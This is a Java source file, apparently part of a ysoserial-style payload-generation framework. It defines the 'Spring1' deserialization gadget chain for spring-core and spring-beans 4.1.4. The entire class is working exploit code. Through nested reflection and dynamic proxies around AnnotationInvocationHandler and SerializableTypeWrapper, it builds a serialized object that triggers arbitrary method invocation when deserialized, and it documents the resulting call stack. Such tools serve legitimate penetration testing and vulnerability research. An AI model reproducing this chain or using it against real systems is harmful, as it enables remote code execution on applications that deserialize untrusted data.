package org.ses.gadgetbuilder.chains1;

import org.ses.gadgetbuilder.adapters.MethodInvokeAdapter;
import org.ses.gadgetbuilder.annotations.Authors;
import org.ses.gadgetbuilder.annotations.Dependencies;
import org.ses.gadgetbuilder.annotations.Impact;
import org.ses.gadgetbuilder.chains.main.MethodInvokeGadgetChain;
import org.ses.gadgetbuilder.chains.main.TrampolineConnector;
import org.ses.gadgetbuilder.chains.trampolines.NoTrampoline;

import org.ses.gadgetbuilder.exceptions.AdapterMismatchException;
import org.ses.gadgetbuilder.util.Reflections;
import org.springframework.beans.factory.ObjectFactory;

import java.io.Serializable;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.lang.reflect.Type;
import java.util.HashMap;
import java.util.Map;

@Dependencies({"org.springframework:spring-core:4.1.4.RELEASE","org.springframework:spring-beans:4.1.4.RELEASE"})
@Authors({ Authors.FROHOFF })
@Impact(Impact.MethodInvoke)
public class Spring1 extends MethodInvokeGadgetChain<NoTrampoline, MethodInvokeAdapter> {


    public Spring1(NoTrampoline _trampoline, MethodInvokeAdapter _adapter) {
        super(_trampoline, _adapter);
    }

    @Override
    protected TrampolineConnector createPayload(String command) throws Exception {
        final Object payload = this.methodInvokeAdapter.getInvocationTarget(command);

        Map handlerMap = new HashMap<>();
        handlerMap.put("getObject", payload);

        InvocationHandler annotationInvocationHandler = (InvocationHandler) Reflections
                .getFirstCtor("sun.reflect.annotation.AnnotationInvocationHandler")
                .newInstance(Override.class, handlerMap);

        final ObjectFactory objectFactoryProxy = (ObjectFactory) Proxy.newProxyInstance(
                Spring1.class.getClassLoader(), new Class[] {ObjectFactory.class}, annotationInvocationHandler);

        InvocationHandler delegatingInvocationHandler = (InvocationHandler) Reflections
            .getFirstCtor("org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler")
            .newInstance(objectFactoryProxy);

        Class targetInterface = this.methodInvokeAdapter.getTargetInterface();

        if (targetInterface == null) {
            throw new AdapterMismatchException("Spring gadget chain requires a sink method adapter class that has interfaces " +
                    "corresponding to the to be invoked methods. This is not the case for " + this.methodInvokeAdapter.getClass().getSimpleName());
        }

        final Type typeTemplatesProxy = (Type) Proxy.newProxyInstance(
                Spring1.class.getClassLoader(), new Class[] {Type.class, targetInterface}, delegatingInvocationHandler);

        Map handlerMap2 = new HashMap<>();
        handlerMap2.put("getType", typeTemplatesProxy);
        InvocationHandler annotationInvocationHandler2 = (InvocationHandler) Reflections
                .getFirstCtor("sun.reflect.annotation.AnnotationInvocationHandler")
                .newInstance(Override.class, handlerMap2);

        final Object typeProviderProxy = Proxy.newProxyInstance(Spring1.class.getClassLoader(),
                new Class[] { Class.forName("org.springframework.core.SerializableTypeWrapper$TypeProvider")}, annotationInvocationHandler2);


        Object mitp = Reflections.createWithoutConstructor(Class.forName("org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider"));
        Reflections.setFieldValue(mitp, "provider", typeProviderProxy);
        Reflections.setFieldValue(mitp, "methodName", this.methodInvokeAdapter.getMethodName());

        return new TrampolineConnector(mitp);
    }

    @Override
    protected void postProcessPayload() throws Exception {

    }

    @Override
    protected String getStackTrace() {
        return "org.springframework.core.SerializableTypeWrapper.SerializableTypeWrapper.MethodInvokeTypeProvider.readObject()\n" +
                "SerializableTypeWrapper.TypeProvider(Proxy).getType()\n" +
                "AnnotationInvocationHandler.invoke()\n" +
                "HashMap.get()\n" +
                "ReflectionUtils.findMethod()\n" +
                "SerializableTypeWrapper.TypeProvider(Proxy).getType()\n" +
                "AnnotationInvocationHandler.invoke()\n" +
                "HashMap.get()\n" +
                "ReflectionUtils.invokeMethod()\n" +
                "Method.invoke()\n" +
                "Method.invoke()\n" +
                "Templates(Proxy).newTransformer()\n" +
                "AutowireUtils.ObjectFactoryDelegatingInvocationHandler.invoke()\n" +
                "ObjectFactory(Proxy).getObject()\n" +
                "AnnotationInvocationHandler.invoke()\n" +
                "HashMap.get()\n" +
                "Method.invoke()";
    }
}
